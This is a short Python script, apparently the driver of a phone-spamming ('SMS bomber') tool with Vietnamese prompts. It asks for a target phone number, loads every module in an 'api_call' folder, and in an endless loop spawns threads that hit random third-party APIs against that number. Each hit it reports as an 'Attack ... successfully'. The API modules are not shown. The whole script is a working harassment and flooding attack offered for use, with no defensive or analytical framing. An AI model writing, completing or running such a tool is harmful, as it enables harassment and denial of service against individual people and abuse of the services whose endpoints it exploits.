import os
import random
import importlib
import threading

fin = os.listdir("api_call")
fout = []

sdt = input("Nhập SĐT: ")

for i in fin:
    if "__" in i: 
        continue
    fout.append(i.replace(".py", ""))

modules = {name: importlib.import_module(f"api_call.{name}") for name in fout}

def call_api(mod, sdt):
    try:
        resp = modules[mod].call(sdt)
        if resp.status_code == 200:
            print(f"Attack {mod} successfully on phone number | {sdt}!")
        else:
            print(f"Attack {mod} failed!")
    except Exception as e:
        with open("logcall.log", "a") as f:
            f.write(f"Error with api {mod}: {e}\n")

while True:
    mod = random.choice(fout)
    thread = threading.Thread(target=call_api, args=(mod, sdt))
    thread.start()